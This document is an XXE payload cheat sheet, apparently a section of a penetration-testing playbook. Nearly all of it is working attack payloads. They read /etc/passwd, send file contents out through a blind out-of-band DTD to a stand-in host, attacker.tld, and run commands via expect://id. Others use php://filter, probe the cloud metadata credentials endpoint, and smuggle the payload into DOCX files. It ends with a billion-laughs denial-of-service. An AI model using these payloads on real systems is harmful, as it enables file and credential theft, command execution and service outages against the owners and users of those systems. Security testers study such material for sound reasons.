# PAYLOADS — XXE

> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.

## 5. XXE

### CLASSIC FILE READ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### OOB BLIND — `x.dtd`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.tld/x.dtd">
  %ext;
]>
<foo>&exfil;</foo>
```
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?d=%file;'>">
%eval;
%exfil;
```

### OOB ERROR-BASED — `x.dtd`
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### XINCLUDE / SVG / PHP / SSRF
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

### OFFICE FILES (DOCX/XLSX) / BILLION LAUGHS
```
1. unzip doc.docx
2. Edit word/document.xml — add DOCTYPE + ENTITY
3. zip back as .docx → upload
```
```xml
<!DOCTYPE foo [
  <!ENTITY a "X">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  ...
]>
<foo>&z;</foo>
```

---
